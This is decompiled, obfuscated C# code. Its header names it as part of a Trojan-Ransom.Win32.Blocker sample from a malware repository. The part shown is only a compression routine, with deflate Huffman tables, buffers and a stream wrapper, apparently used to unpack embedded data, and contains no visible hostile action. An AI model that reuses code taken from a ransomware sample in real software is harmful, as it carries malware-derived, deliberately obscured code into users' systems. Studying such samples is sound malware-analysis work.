// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Pass, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79B654F2-A9B8-4BE3-9734-859D467B8C8A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00032-msil\Trojan-Ransom.Win32.Blocker.alkh-77164545a196556797cfbc35a71289019e69cc53b20c45eb74f3d877c3c1e0d3.exe.exe

using \u0001;
using System.IO;

namespace \u0001
{
  internal class \u0004
  {
    public static string \u0001;

    internal sealed class \u0001
    {
      private const int \u0001 = 0;
      private const int \u0002 = 1;
      private const int \u0003 = 2;
      private const int \u0004 = 3;
      private const int \u0005 = 4;
      private const int \u0006 = 5;
      private const int \u0007 = 6;
      private const int \u0008 = 7;
      private const int \u000E = 8;
      private const int \u000F = 9;
      private const int \u0010 = 10;
      private const int \u0011 = 11;
      private const int \u0012 = 12;
      internal static readonly int[] \u0013 = new int[29]
      {
        3,
        4,
        5,
        6,
        7,
        8,
        9,
        10,
        11,
        13,
        15,
        17,
        19,
        23,
        27,
        31,
        35,
        43,
        51,
        59,
        67,
        83,
        99,
        115,
        131,
        163,
        195,
        227,
        258
      };
      internal static readonly int[] \u0014 = new int[29]
      {
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        1,
        1,
        1,
        1,
        2,
        2,
        2,
        2,
        3,
        3,
        3,
        3,
        4,
        4,
        4,
        4,
        5,
        5,
        5,
        5,
        0
      };
      internal static readonly int[] \u0015 = new int[30]
      {
        1,
        2,
        3,
        4,
        5,
        7,
        9,
        13,
        17,
        25,
        33,
        49,
        65,
        97,
        129,
        193,
        257,
        385,
        513,
        769,
        1025,
        1537,
        2049,
        3073,
        4097,
        6145,
        8193,
        12289,
        16385,
        24577
      };
      internal static readonly int[] \u0016 = new int[30]
      {
        0,
        0,
        0,
        0,
        1,
        1,
        2,
        2,
        3,
        3,
        4,
        4,
        5,
        5,
        6,
        6,
        7,
        7,
        8,
        8,
        9,
        9,
        10,
        10,
        11,
        11,
        12,
        12,
        13,
        13
      };
      internal int \u0017;
      internal int \u0018;
      internal int \u0019;
      internal int \u001A;
      internal int \u001B;
      internal bool \u001C;
      internal \u0004.\u0002 \u001D;
      internal \u0004.\u0003 \u001E;
      internal \u0004.\u0005 \u001F;
      internal \u0004.\u0004 \u007F;
      internal \u0004.\u0004 \u0080;

      public \u0001(byte[] bytes)
      {
        this.\u001D = new \u0004.\u0002();
        this.\u001E = new \u0004.\u0003();
        this.\u0017 = 2;
        \u0005.\u0001(0, bytes.Length, bytes, this.\u001D);
      }
    }

    internal sealed class \u0002
    {
      internal byte[] \u0001;
      internal int \u0002 = 0;
      internal int \u0003 = 0;
      internal uint \u0004 = 0;
      internal int \u0005 = 0;

      public int AvailableBits => this.\u0005;

      public int AvailableBytes => this.\u0003 - this.\u0002 + (this.\u0005 >> 3);

      public bool IsNeedingInput => this.\u0002 == this.\u0003;
    }

    internal sealed class \u0003
    {
      private const int \u0001 = 32768;
      private const int \u0002 = 32767;
      internal byte[] \u0003 = new byte[32768];
      internal int \u0004 = 0;
      internal int \u0005 = 0;
    }

    internal sealed class \u0004
    {
      private const int \u0001 = 15;
      internal short[] \u0002;
      public static readonly \u0004.\u0004 \u0003;
      public static readonly \u0004.\u0004 \u0004;

      static \u0004()
      {
        byte[] codeLengths1 = new byte[288];
        int num1 = 0;
        while (num1 < 144)
          codeLengths1[num1++] = (byte) 8;
        while (num1 < 256)
          codeLengths1[num1++] = (byte) 9;
        while (num1 < 280)
          codeLengths1[num1++] = (byte) 7;
        while (num1 < 288)
          codeLengths1[num1++] = (byte) 8;
        \u0004.\u0004.\u0003 = new \u0004.\u0004(codeLengths1);
        byte[] codeLengths2 = new byte[32];
        int num2 = 0;
        while (num2 < 32)
          codeLengths2[num2++] = (byte) 5;
        \u0004.\u0004.\u0004 = new \u0004.\u0004(codeLengths2);
      }

      public \u0004(byte[] codeLengths) => \u0005.\u0001(this, codeLengths);
    }

    internal sealed class \u0005
    {
      private const int \u0001 = 0;
      private const int \u0002 = 1;
      private const int \u0003 = 2;
      private const int \u0004 = 3;
      private const int \u0005 = 4;
      private const int \u0006 = 5;
      internal static readonly int[] \u0007 = new int[3]
      {
        3,
        3,
        11
      };
      internal static readonly int[] \u0008 = new int[3]
      {
        2,
        3,
        7
      };
      internal byte[] \u000E;
      internal byte[] \u000F;
      internal \u0004.\u0004 \u0010;
      internal int \u0011;
      internal int \u0012;
      internal int \u0013;
      internal int \u0014;
      internal int \u0015;
      internal int \u0016;
      internal byte \u0017;
      internal int \u0018;
      internal static readonly int[] \u0019 = new int[19]
      {
        16,
        17,
        18,
        0,
        8,
        7,
        9,
        6,
        10,
        5,
        11,
        4,
        12,
        3,
        13,
        2,
        14,
        1,
        15
      };
    }

    internal sealed class \u0006
    {
      private const int \u0001 = 4;
      private const int \u0002 = 8;
      private const int \u0003 = 16;
      private const int \u0004 = 20;
      private const int \u0005 = 28;
      private const int \u0006 = 30;
      internal int \u0007 = 16;
      internal long \u0008 = 0;
      internal \u0004.\u000E \u000E;
      internal \u0004.\u0008 \u000F;

      public \u0006()
      {
        this.\u000E = new \u0004.\u000E();
        this.\u000F = new \u0004.\u0008(this.\u000E);
      }

      public long TotalOut => this.\u0008;

      public bool IsFinished => this.\u0007 == 30 && this.\u000E.\u0003 == 0;

      public bool IsNeedingInput => \u0005.\u0001(this.\u000F);
    }

    internal sealed class \u0007
    {
      private const int \u0001 = 16384;
      private const int \u0002 = 286;
      private const int \u0003 = 30;
      private const int \u0004 = 19;
      private const int \u0005 = 16;
      private const int \u0006 = 17;
      private const int \u0007 = 18;
      private const int \u0008 = 256;
      internal static readonly int[] \u000E = new int[19]
      {
        16,
        17,
        18,
        0,
        8,
        7,
        9,
        6,
        10,
        5,
        11,
        4,
        12,
        3,
        13,
        2,
        14,
        1,
        15
      };
      internal static readonly byte[] \u000F = new byte[16]
      {
        (byte) 0,
        (byte) 8,
        (byte) 4,
        (byte) 12,
        (byte) 2,
        (byte) 10,
        (byte) 6,
        (byte) 14,
        (byte) 1,
        (byte) 9,
        (byte) 5,
        (byte) 13,
        (byte) 3,
        (byte) 11,
        (byte) 7,
        (byte) 15
      };
      internal \u0004.\u000E \u0010;
      internal \u0004.\u0007.\u0001 \u0011;
      internal \u0004.\u0007.\u0001 \u0012;
      internal \u0004.\u0007.\u0001 \u0013;
      internal short[] \u0014;
      internal byte[] \u0015;
      internal int \u0016;
      internal int \u0017;
      internal static readonly short[] \u0018 = new short[286];
      internal static readonly byte[] \u0019 = new byte[286];
      internal static readonly short[] \u001A;
      internal static readonly byte[] \u001B;

      static \u0007()
      {
        int index1;
        for (index1 = 0; index1 < 144; \u0004.\u0007.\u0019[index1++] = (byte) 8)
          \u0004.\u0007.\u0018[index1] = \u0005.\u0001(48 + index1 << 8);
        for (; index1 < 256; \u0004.\u0007.\u0019[index1++] = (byte) 9)
          \u0004.\u0007.\u0018[index1] = \u0005.\u0001(256 + index1 << 7);
        for (; index1 < 280; \u0004.\u0007.\u0019[index1++] = (byte) 7)
          \u0004.\u0007.\u0018[index1] = \u0005.\u0001(index1 - 256 << 9);
        for (; index1 < 286; \u0004.\u0007.\u0019[index1++] = (byte) 8)
          \u0004.\u0007.\u0018[index1] = \u0005.\u0001(index1 - 88 << 8);
        \u0004.\u0007.\u001A = new short[30];
        \u0004.\u0007.\u001B = new byte[30];
        for (int index2 = 0; index2 < 30; ++index2)
        {
          \u0004.\u0007.\u001A[index2] = \u0005.\u0001(index2 << 11);
          \u0004.\u0007.\u001B[index2] = (byte) 5;
        }
      }

      public \u0007(\u0004.\u000E pending)
      {
        this.\u0010 = pending;
        this.\u0011 = new \u0004.\u0007.\u0001(this, 286, 257, 15);
        this.\u0012 = new \u0004.\u0007.\u0001(this, 30, 1, 15);
        this.\u0013 = new \u0004.\u0007.\u0001(this, 19, 4, 7);
        this.\u0014 = new short[16384];
        this.\u0015 = new byte[16384];
      }

      public sealed class \u0001
      {
        public short[] \u0001;
        public byte[] \u0002;
        public int \u0003;
        public int \u0004;
        internal short[] \u0005;
        internal int[] \u0006;
        internal int \u0007;
        internal \u0004.\u0007 \u0008;

        public \u0001(\u0004.\u0007 dh, int elems, int minCodes, int maxLength)
        {
          this.\u0008 = dh;
          this.\u0003 = minCodes;
          this.\u0007 = maxLength;
          this.\u0001 = new short[elems];
          this.\u0006 = new int[maxLength];
        }
      }
    }

    internal sealed class \u0008
    {
      private const int \u0001 = 258;
      private const int \u0002 = 3;
      private const int \u0003 = 32768;
      private const int \u0004 = 32767;
      private const int \u0005 = 32768;
      private const int \u0006 = 32767;
      private const int \u0007 = 5;
      private const int \u0008 = 262;
      private const int \u000E = 32506;
      private const int \u000F = 4096;
      internal int \u0010;
      internal short[] \u0011;
      internal short[] \u0012;
      internal int \u0013;
      internal int \u0014;
      internal bool \u0015;
      internal int \u0016;
      internal int \u0017;
      internal int \u0018;
      internal byte[] \u0019;
      internal byte[] \u001A;
      internal int \u001B;
      internal int \u001C;
      internal int \u001D;
      internal \u0004.\u000E \u001E;
      internal \u0004.\u0007 \u001F;

      public \u0008(\u0004.\u000E pending)
      {
        this.\u001E = pending;
        this.\u001F = new \u0004.\u0007(pending);
        this.\u0019 = new byte[65536];
        this.\u0011 = new short[32768];
        this.\u0012 = new short[32768];
        this.\u0016 = this.\u0017 = 1;
      }
    }

    internal sealed class \u000E
    {
      protected internal byte[] \u0001 = new byte[65536];
      internal int \u0002 = 0;
      internal int \u0003 = 0;
      internal uint \u0004 = 0;
      internal int \u0005 = 0;

      public int BitCount => this.\u0005;

      public bool IsFlushed => this.\u0003 == 0;
    }

    internal sealed class \u000F : MemoryStream
    {
      public \u000F()
      {
      }

      public \u000F(byte[] buffer)
        : base(buffer, false)
      {
      }
    }
  }
}
